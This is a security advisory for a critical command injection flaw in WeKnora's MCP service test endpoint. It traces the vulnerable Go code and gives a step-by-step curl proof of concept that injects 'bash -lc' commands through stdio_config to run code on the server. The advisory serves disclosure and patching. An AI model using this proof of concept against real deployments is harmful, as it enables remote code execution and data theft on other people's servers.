# WeKnora has Command Injection in MCP stdio test

**GHSA**: GHSA-78h3-63c4-5fqc | **CVE**: CVE-2026-22688 | **Severity**: critical (CVSS 10.0)

**CWE**: CWE-77

**Affected Packages**:
- **github.com/Tencent/WeKnora** (go): < 0.2.5

## Description

### Vulnerability **Description**

---

**Vulnerability Overview**


This issue is a command injection vulnerability (CWE-78) that allows authenticated users to inject stdio_config.command/args into MCP stdio settings, causing the server to execute subprocesses using these injected values.

The root causes are as follows:

- **Missing Security Filtering**: When transport_type=stdio, there is no validation on stdio_config.command/args, such as allowlisting, enforcing fixed paths/binaries, or blocking dangerous options.
- **Functional Flaw (Trust Boundary Violation)**: The command/args stored as "service configuration data" are directly used in the /test execution flow and connected to execution sinks without validation.
- **Lack of Authorization Control**: This functionality effectively allows "process execution on the server" (an administrative operation), yet no administrator-only permission checks are implemented in the code (accessible with Bearer authentication only).

**Vulnerable Code**

1. **API Route Registration** (path where endpoints are created)
****https://github.com/Tencent/WeKnora/blob/6b7558c5592828380939af18240a4cef67a2cbfc/internal/router/router.go#L85-L110
https://github.com/Tencent/WeKnora/blob/6b7558c5592828380939af18240a4cef67a2cbfc/internal/router/router.go#L371-L390
    
    ```go
     // 认证中间件
    	r.Use(middleware.Auth(params.TenantService, params.UserService, params.Config))
    
    	// 添加OpenTelemetry追踪中间件
    	r.Use(middleware.TracingMiddleware())
    
    	// 需要认证的API路由
    	v1 := r.Group("/api/v1")
    	{
    		RegisterAuthRoutes(v1, params.AuthHandler)
    		RegisterTenantRoutes(v1, params.TenantHandler)
    		RegisterKnowledgeBaseRoutes(v1, params.KBHandler)
    		RegisterKnowledgeTagRoutes(v1, params.TagHandler)
    		RegisterKnowledgeRoutes(v1, params.KnowledgeHandler)
    		RegisterFAQRoutes(v1, params.FAQHandler)
    		RegisterChunkRoutes(v1, params.ChunkHandler)
    		RegisterSessionRoutes(v1, params.SessionHandler)
    		RegisterChatRoutes(v1, params.SessionHandler)
    		RegisterMessageRoutes(v1, params.MessageHandler)
    		RegisterModelRoutes(v1, params.ModelHandler)
    		RegisterEvaluationRoutes(v1, params.EvaluationHandler)
    		RegisterInitializationRoutes(v1, params.InitializationHandler)
    		RegisterSystemRoutes(v1, params.SystemHandler)
    		RegisterMCPServiceRoutes(v1, params.MCPServiceHandler)
    		RegisterWebSearchRoutes(v1, params.WebSearchHandler)
    	}
    ```
    
    ```go
    func RegisterMCPServiceRoutes(r *gin.RouterGroup, handler *handler.MCPServiceHandler) {
    	mcpServices := r.Group("/mcp-services")
    	{
    		// Create MCP service
    		mcpServices.POST("", handler.CreateMCPService)
    		// List MCP services
    		mcpServices.GET("", handler.ListMCPServices)
    		// Get MCP service by ID
    		mcpServices.GET("/:id", handler.GetMCPService)
    		// Update MCP service
    		mcpServices.PUT("/:id", handler.UpdateMCPService)
    		// Delete MCP service
    		mcpServices.DELETE("/:id", handler.DeleteMCPService)
    		// Test MCP service connection
    		mcpServices.POST("/:id/test", handler.TestMCPService)
    		// Get MCP service tools
    		mcpServices.GET("/:id/tools", handler.GetMCPServiceTools)
    		// Get MCP service resources
    		mcpServices.GET("/:id/resources", handler.GetMCPServiceResources)
    	}
    ```
    
2. **User input (JSON) → types.MCPService binding** (POST /api/v1/mcp-services)
****https://github.com/Tencent/WeKnora/blob/6b7558c5592828380939af18240a4cef67a2cbfc/internal/handler/mcp_service.go#L40-L55
    
    ```go
    	var service types.MCPService
    	if err := c.ShouldBindJSON(&service); err != nil {
    		logger.Error(ctx, "Failed to parse MCP service request", err)
    		c.Error(errors.NewBadRequestError(err.Error()))
    		return
    	}
    
    	tenantID := c.GetUint64(types.TenantIDContextKey.String())
    	if tenantID == 0 {
    		logger.Error(ctx, "Tenant ID is empty")
    		c.Error(errors.NewBadRequestError("Tenant ID cannot be empty"))
    		return
    	}
    	service.TenantID = tenantID
    
    	if err := h.mcpServiceService.CreateMCPService(ctx, &service); err != nil {
    ```
    
3. **Taint propagation (storage)**: The bound service object is stored directly in the database without sanitization.
****https://github.com/Tencent/WeKnora/blob/6b7558c5592828380939af18240a4cef67a2cbfc/internal/application/repository/mcp_service.go#L23-L25
    
    ```go
    func (r *mcpServiceRepository) Create(ctx context.Context, service *types.MCPService) error {
    	return r.db.WithContext(ctx).Create(service).Error
    }
    ```
    
4. **Sink execution**: /test endpoint loads the service from the database → executes TestMCPService
    
    https://github.com/Tencent/WeKnora/blob/6b7558c5592828380939af18240a4cef67a2cbfc/internal/handler/mcp_service.go#L323-L325
    https://github.com/Tencent/WeKnora/blob/6b7558c5592828380939af18240a4cef67a2cbfc/internal/application/service/mcp_service.go#L238-L264
    
    ```go
    	logger.Infof(ctx, "Testing MCP service: %s", secutils.SanitizeForLog(serviceID))
    
    	result, err := h.mcpServiceService.TestMCPService(ctx, tenantID, serviceID)
    ```
    
    ```go
    	service, err := s.mcpServiceRepo.GetByID(ctx, tenantID, id)
    	if err != nil {
    		return nil, fmt.Errorf("failed to get MCP service: %w", err)
    	}
    	if service == nil {
    		return nil, fmt.Errorf("MCP service not found")
    	}
    
    	// Create temporary client for testing
    	config := &mcp.ClientConfig{
    		Service: service,
    	}
    
    	client, err := mcp.NewMCPClient(config)
    	if err != nil {
    		return &types.MCPTestResult{
    			Success: false,
    			Message: fmt.Sprintf("Failed to create client: %v", err),
    		}, nil
    	}
    
    	// Connect
    	testCtx, cancel := context.WithTimeout(ctx, 30*time.Second)
    	defer cancel()
    
    	if err := client.Connect(testCtx); err != nil {
    		return &types.MCPTestResult{
    ```
    
5. **Ultimate sink (subprocess execution)**: The command/args values from stdio configuration are directly used in the subprocess execution path.
****https://github.com/Tencent/WeKnora/blob/6b7558c5592828380939af18240a4cef67a2cbfc/internal/mcp/client.go#L120-L137
https://github.com/Tencent/WeKnora/blob/6b7558c5592828380939af18240a4cef67a2cbfc/internal/mcp/client.go#L158-L160
    
    ```go
    	case types.MCPTransportStdio:
    		if config.Service.StdioConfig == nil {
    			return nil, fmt.Errorf("stdio_config is required for stdio transport")
    		}
    
    		// Convert env vars map to []string format (KEY=value)
    		envVars := make([]string, 0, len(config.Service.EnvVars))
    		for key, value := range config.Service.EnvVars {
    			envVars = append(envVars, fmt.Sprintf("%s=%s", key, value))
    		}
    
    		// Create stdio client with options
    		// NewStdioMCPClientWithOptions(command string, env []string, args []string, opts ...transport.StdioOption)
    		mcpClient, err = client.NewStdioMCPClientWithOptions(
    			config.Service.StdioConfig.Command,
    			envVars,
    			config.Service.StdioConfig.Args,
    		)
    ```
    
    ```go
    	if err := c.client.Start(ctx); err != nil {
    		return fmt.Errorf("failed to start client: %w", err)
    	}
    ```
    

### PoC

---

**PoC Description**
 
- Obtain an authentication token.
- Create an MCP service with transport_type=stdio, injecting the command to execute into stdio_config.command/args.
- Call the /test endpoint to trigger the Connect() → Start() execution flow, confirming command execution on the server via side effects (e.g., file creation).

**PoC**
 
- **Container state verification (pre-exploitation)**
    
    ```bash
    docker exec -it WeKnora-app /bin/bash
    cd /tmp/; ls -l
    ```
    
    <img width="798" height="78" alt="image" src="https://github.com/user-attachments/assets/3e387e39-cd80-4e30-ba23-3db9ff879209" />
    
- **Authenticate via /api/v1/auth/login to obtain a Bearer token for API calls.**
    
    ```bash
    API="http://localhost:8080"
    EMAIL="admin@gmail.com"
    PASS="admin123"
    
    TOKEN="$(curl -sS -X POST "$API/api/v1/auth/login" \
      -H "Content-Type: application/json" \
      -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" | jq -r '.token // empty')"
      
    echo "TOKEN=$TOKEN"
    ```
    
    <img width="760" height="73" alt="image" src="https://github.com/user-attachments/assets/4e588f20-9371-4dc3-b585-def2cd752497" />
    
    <img width="1679" height="193" alt="image" src="https://github.com/user-attachments/assets/a372981c-dc4c-40e9-a9af-4d27fd36251a" />
    
- **POST to /api/v1/mcp-services with transport_type=stdio and stdio_config to define the command and arguments to be executed on the server.**
    
    ```bash
    CREATE_RES="$(curl -sS -X POST "$API/api/v1/mcp-services" \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d '{
        "name":"rce",
        "description":"rce",
        "enabled":true,
        "transport_type":"stdio",
        "stdio_config":{"command":"bash","args":["-lc","id > /tmp/RCE_ok.txt && uname -a >> /tmp/RCE_ok.txt"]},
        "env_vars":{}
      }')"
      
    MCP_ID="$(echo "$CREATE_RES" | jq -r '.data.id // empty')"
    echo "MCP_ID=$MCP_ID"
    ```
    
    <img width="1296" height="354" alt="image" src="https://github.com/user-attachments/assets/d109dd4e-d051-46e3-bdcc-4d1a181d1635" />
    
- **Invoke /api/v1/mcp-services/{id}/test to trigger Connect(), causing execution of the stdio subprocess.**
    
    ```bash
    curl -sS -X POST "$API/api/v1/mcp-services/$MCP_ID/test" \
      -H "Authorization: Bearer $TOKEN" | jq .
    ```
    
    <img width="1270" height="217" alt="image" src="https://github.com/user-attachments/assets/2723ef39-f6b8-4478-b60e-5b6a4e667a1e" />
    
- **Post-exploitation verification (container state)**
    
    ```bash
    ls -l
    ```
    
    <img width="1243" height="221" alt="image" src="https://github.com/user-attachments/assets/5f78f83a-64e2-4a0a-95c4-6832f606fbcd" />
    

### Impact

---

- **Remote Code Execution (RCE)**: Arbitrary command execution enables file creation/modification, execution of additional payloads, and service disruption
- **Information Disclosure**: Sensitive data exfiltration through reading environment variables, configuration files, keys, tokens, and local files
- **Privilege Escalation/Lateral Movement (Environment-Dependent)**: Impact may escalate based on container mounts, network policies, and internal service access permissions
- **Cross-Tenant Boundary Impact**: Execution occurs in a shared backend runtime; depending on deployment configuration, impact may extend beyond tenant boundaries (**exact scope is uncertain** and varies by deployment setup)
